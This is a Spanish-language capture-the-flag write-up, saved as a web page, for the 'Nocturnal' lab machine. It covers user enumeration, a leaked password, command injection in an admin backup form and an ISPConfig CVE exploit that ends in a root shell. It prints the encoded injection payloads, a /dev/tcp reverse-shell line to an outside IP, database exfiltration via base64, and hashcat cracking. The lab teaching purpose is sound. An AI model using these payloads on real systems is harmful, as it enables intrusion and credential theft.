<!DOCTYPE html>
<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">

    <title>Nocturnal - juanchan.es</title>


    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
    </head>


<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>


    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./Nocturnal.JPG"> <span class="mono authors"> <a href="https://juanchan.es/assets/maquinas/nocturnal.html" itemprop="name">Nocturnal</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Abr, 2025 </time><hr><main itemprop="articleBody" style="position: relative">




<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
<pre><code class="language-bash">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<h2 id="2-enumeración-de-usuarios">2. Enumeración de usuarios</h2>
<p>Una vez añadido el dominio <code>nocturnal.htb</code>al fichero <code>/etc/hosts</code>, y accedemos y nos registramos en el recurso web <strong><a href="http://nocturnal.htb/dashborad.php">http://nocturnal.htb/dashborad.php</a></strong>, observamos como en el endpoint <code>/dashboard.php</code> existe un formulario para subir archivos.
Si intentamos subir un archivo con extensión .php, observamos el siguiente mensaje de error:</p>
<pre><code class="language-bash">Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.
</code></pre>
<p>Sin embargo, si subimos un archivo válido, podemos descargarlo directamente desde el dashboard del propio usuario. Para dicha descarga la aplicación hace una petición al endpoint <code>/view.php?username=test1&amp;file=test.pdf</code>. Por lo que viendo esto, se nos puede ocurrir intentar realizar una enumeración de usuarios válidos y sus archivos.</p>
<p>Utilizando el módulo de automate del proxy Caido, y utilizando para ello el wordlist de Xato, observamos que para los usuarios que no existen en el sistema se obtiene el mensaje <code>User not found</code>, por lo que tendremos que filtrar por dicho mensaje. Vemos entonces que existen los siguientes usuarios: test1, tester, amanda, admin, tobias.</p>
<h2 id="3-enumeración-de-archivos">3. Enumeración de archivos</h2>
<p>Ahora que tenemos los posibles lo usuarios, tenemos que intentar obtener los archivos de dichos usuarios. Si enviamos una petición con un nombre de usuario válido, pero con un archivo no existente, por ejemplo al endpoint <code>/view.php?username=test1&amp;file=test2.pdf</code>, obtenemos el siguiente contenido en la respuesta, en el que se pueden ver todos los archivos de dicho usuario:</p>
<pre><code class="language-bash">&lt;div class=&quot;container&quot;&gt;
    &lt;h1&gt;File Viewer&lt;/h1&gt;

    &lt;div class=&#39;error&#39;&gt;File does not exist.&lt;/div&gt;
    &lt;h2&gt;Available files for download:&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;view.php?username=test1&amp;file=dummy.pdf&quot;&gt;dummy.pdf&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;view.php?username=test1&amp;file=test.pdf&quot;&gt;test.pdf&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;
</code></pre>
<p>Por lo que si listamos los archivos de cada usuario, vemos que para el usuario amanda encontramos la siguiente respuesta:</p>
<pre><code class="language-bash">&lt;div class=&quot;container&quot;&gt;
    &lt;h1&gt;File Viewer&lt;/h1&gt;

    &lt;div class=&#39;error&#39;&gt;File does not exist.&lt;/div&gt;
    &lt;h2&gt;Available files for download:&lt;/h2&gt;
    &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;view.php?username=amanda&amp;file=privacy.odt&quot;&gt;privacy.odt&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
&lt;/div&gt;
</code></pre>
<p>Descargamos entonces dicho archivo (privacy.odt), mediante una petición get al recurso <code>http://nocturnal.htb/view.php?username=amanda&amp;file=privacy.odt</code>. En dicha carpeta descargada, podemos ver un archivo llamado <code>content.xml</code>, el cual incluye el siguiente contenido:</p>
<pre><code class="language-bash">&lt;text:p text:style-name=&quot;P1&quot;&gt;
    Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
&lt;/text:p&gt;
</code></pre>
<p>Probamos entonces acceder al panel web con las credenciales amanda - arHkG7HAI68X8s1J, y observamos como conseguimos acceso.</p>
<h2 id="4-explotación">4. Explotación</h2>
<p>En el dashboard vemos un link que nos lleva al panel de administración <code>http://nocturnal.htb/admin.php</code>. En él vemos un formulario en el que podemos crear un nuevo backup, y establecer una contraseña para crearlo. Dicha creación de backup, se crea mediante la siguiente petición:</p>
<pre><code class="language-bash">POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php
Cookie: PHPSESSID=1r3fovr9ssi2gof5jv9l1nbdm0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=&amp;backup=
</code></pre>
<p>Si imaginamos que por detrás se está ejecutando un comando bash para la creación de un backup, podemos intentar explotar un RCE. Para ello probamos varios payloads hasta que descubrimos que con un salto de línea al principio podemos llegar a ejecutar comandos. Por lo que intentamos obtener, por ejemplo, el archivo <code>/etc/passwd</code>, ejecutando la siguiente petición:</p>
<pre><code class="language-bash">POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php
Cookie: PHPSESSID=1r3fovr9ssi2gof5jv9l1nbdm0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=%0abash%09-c%09%22cat%09%2fetc%2fpasswd%22%0a&amp;backup=
</code></pre>
<p>Y obteniendo la siguiente respuesta:</p>
<pre><code class="language-bash">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
ispapps:x:1001:1002::/var/www/apps:/bin/sh
ispconfig:x:1002:1003::/usr/local/ispconfig:/bin/sh
smmta:x:115:120:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:116:121:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
</code></pre>
<p>Si intentamos entones lanzar una revershell, mediante el payload: <code>password=%0abash%09-c%09&quot;/bin/bash%09-i%09&gt;&amp;%09/dev/tcp/10.10.14.38/1234%090&gt;&amp;1&quot;%0a&amp;backup=Create+Backup</code>. Obtenemos la siguiente respuesta:</p>
<pre><code class="language-bash">&lt;h3&gt;Output:&lt;/h3&gt;
    &lt;pre&gt;sh: 2: backups/backup_2025-05-11.zip: Permisbash: cannot set terminal process group (883): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@nocturnal:~/nocturnal.htb$ exit
    bash: -c: option requires an argument
    &lt;/pre&gt;
</code></pre>
<p>Navegando entonces por el sistema, vemos que existe una .db de la aplicación. Para obtenerla la decodificamos en base64 y la obtenemos mediante la siguiente petición:</p>
<pre><code class="language-bash">POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://nocturnal.htb
Connection: keep-alive
Referer: http://nocturnal.htb/admin.php
Cookie: PHPSESSID=1r3fovr9ssi2gof5jv9l1nbdm0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=%0Abash%09-c%09&quot;base64%09/var/www/nocturnal_database/nocturnal_database.db&quot;%0A&amp;backup=Create+Backup
</code></pre>
<p>Obtenemos entonces la siguiente cadena de caracteres en base64:</p>
<pre><code class="language-bash">U1FMaXRlIGZvcm1hdCAzB1QCgEgUIBSC4/2Q0P+EDeYDzUPzQ7jDeYgXoEBxcbGwGDS3RhYmxldXBsb2Fkc3VwbG9hZHMFQ1JFQVRFIFRBQkxFIHVwbG9hZHMgKICAgIGlkIElOVEVHRVIgUFJJTUFSWSBLRVkgQVVUT0lOQ1JFTUVOVCwgICA
gdXNlcl9pZCBJTlRFR0VSIE5PVCBOVUxMLCAgICBmaWxlX25hbWUgVEVYVCBOT1QgTlVMTCAgICB1cGxvYWRfdGltZSBEQVRFVElNRSBERUZBVV0gQ1VSUkVOVF9USU1FU1RBTVAsICAgIEZPUkVJR04gS0VZdXNlcl9pZCkgUkVGRVJFTkNFU
yB1c2VycyhpZCkpVDBhcrKwFZdfGFibGVzcWxpdGVfc2VxdWVuY2VzcWxpdGVfc2VxdWVuY2VFQ1JFQVRFIFRBQkxFIHNxbGl0ZV9zZXF1ZW5jZShuYW1lLHNlcSmBFHFxcxYIJdGFibGV1c2Vyc3VzZXJzAkNSRUFURSBUQUJMRSB1c2VycyA
oICAgIGlkIElOVEVHRVIgUFJJTUFSWSBLRVkgQVVUT0lOQ1JFTUVOVCwgICAgdXNlcm5hbWUgVEVYVCBOT1QgTlVMTFVOSVFVRSwgICAgcGFzc3dvcmQgVEVYVCBOT1QgTlVMTKkBhF9EaW5kZXhzcWxpdGVfYXV0b2luZGV4X3VzZXJzXzF1c
2VycwMI3D9UPqQ9D1MPK7+U1zZWJhMTE2NWIwNWZmMzQxMjYyOTZlNGMzYWFiMTUwZmZkY2IpF01lMEFsNTEwMWFkNDU0M2E5NmE3ZmQ4NDkwOGZkMGQ4MDJlN2RiKVNa2F2aWYzOGNkZTE2NTRiMzlmZWEyYmQ0ZjcyZjFhZTRjZGRhKhlNdG
9iaWFzNTVjODJiMWNjZDU1YWIyMTliM2IxMDliMDdkNTA2MWQqGU1hbWFuZGFkZjhiMjBhYTBjOTM1MDIzZjk5ZWE1ODM1OGZiNjNjNClXTWFkbWluZDcyNWFlYmExNDNmNTc1NzM2YjA3ZTA0NWQ4Y2VlYmIKg/F3D+wPzg/YD8UP4QzZWJhF
lMEFsNa2F2aVdG9iaWFzhamFuZGFkWFkbWluDIP6P9Q/oLBsCAxsBdXBsb2FkcwQJQMZXJzC9oD9oJQFwcml2YWN5Lm9kdDIwMjQtMTAtMTggMDI6MDU6NTM=
</code></pre>
<p>Si lo decodificamos en base64 observamos, entre todos los caracteres, lo siguiente:</p>
<pre><code class="language-bash">Mkavif38cde1654b39fea2bd4f72f1ae4cdda
Mtobias55c82b1ccd55ab219b3b109b07d5061d
Mamandadf8b20aa0c935023f99ea58358fb63c4
Madmind725aeb8143f575736b07e045bd8ceeb
</code></pre>
<p>Lo cual pueden ser uno hashes de las contraseñas de los usuarios. Si los acortamos y quitamos la parte de M + nombreUsuario, con <strong>hash-identifier</strong> observamos de que se tratan de hashes md5. Con hashcat intentamos crackearlos:</p>
<pre><code class="language-bash"># hashcat -m0  hashes.txt /usr/share/wordlists/rockyou.txt
</code></pre>
<p>Obteniendo lo siguiente para el usuario tobias:</p>
<pre><code class="language-bash">55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
</code></pre>
<p>Damos entonces accedido al sistema por SSH, con dichos credenciales, y somos capaces de obtener la <strong>flag de usuario</strong>.</p>
<h2 id="5-escalado">5. Escalado</h2>
<p>Una vez dentro, wsi listamos los puertos abiertos con <code># ss -lntu</code>, observamos la siguiente salida:</p>
<pre><code class="language-bash">Netid           State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port           Process           
udp             UNCONN            0                 0                            127.0.0.53%lo:53                               0.0.0.0:*                                
tcp             LISTEN            0                 70                               127.0.0.1:33060                            0.0.0.0:*                                
tcp             LISTEN            0                 151                              127.0.0.1:3306                             0.0.0.0:*                                
tcp             LISTEN            0                 10                               127.0.0.1:587                              0.0.0.0:*                                
tcp             LISTEN            0                 4096                             127.0.0.1:8080                             0.0.0.0:*                                
tcp             LISTEN            0                 511                                0.0.0.0:80                               0.0.0.0:*                                
tcp             LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*                                
tcp             LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*                                
tcp             LISTEN            0                 10                               127.0.0.1:25                               0.0.0.0:*                                
tcp             LISTEN            0                 128                                   [::]:22                                  [::]:*   
</code></pre>
<p>Observamos que en el puerto 8080, hay un servicio expuesto, el cual lo forwardeamos con SSH:</p>
<pre><code class="language-bash"># ssh -L 1234:127.0.0.1:8080 tobias@10.10.11.64
</code></pre>
<p>Si accedemos a dicho servicio, vemos un panel de administración de un servicio llamado <strong>ispconfig</strong>. Probamos varios usuarios, y vemos que podemos acceder con el usuario admin y la misma contraseña que para el usuario tobias, es decir, con las credenciales <code>admin:slowmotionapocalypse</code>. </p>
<p>En dicho panel web, podemos ver como ISPConfig utiliza la versión <strong>ISPConfig 3.2.10p1</strong>. Buscando alguna vulnerabilidad que afecte a dicha versión encontramos el <strong>CVE-2023-46818</strong>, sobre el cual existe el siguiente exploit (<a href="https://github.com/bipbopbup/CVE-2023-46818-python-exploit">https://github.com/bipbopbup/CVE-2023-46818-python-exploit</a>), el cual es capaz de ejecutar código a través de una inyección PHP. Para ejecutarlo realizamos:</p>
<pre><code class="language-bash"># git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit
</code></pre>
<p>Y ejecutamos:</p>
<pre><code class="language-bash"># python exploit.py http://localhost:1234 admin slowmotionapocalypse
</code></pre>
<p>Observamos que se nos crea una shell con el usuario root, por lo que somos capaces de obtener la <strong>flag de root</strong>:</p>
<pre><code class="language-bash"># python exploit.py http://localhost:1234 admin slowmotionapocalypse     
[+] Target URL: http://localhost:1234/
[+] Logging in with username &#39;admin&#39; and password &#39;slowmotionapocalypse&#39;
[+] Injecting shell
[+] Launching shell

ispconfig-shell# whoami
root
</code></pre>





<p>&nbsp;</p><p>&nbsp;</p>
</div>
     <div class="footer-credits" style="display: flex; justify-content: flex-end">
        <a> Made by Juan González </a>
    </div>
</div>
</body></html>
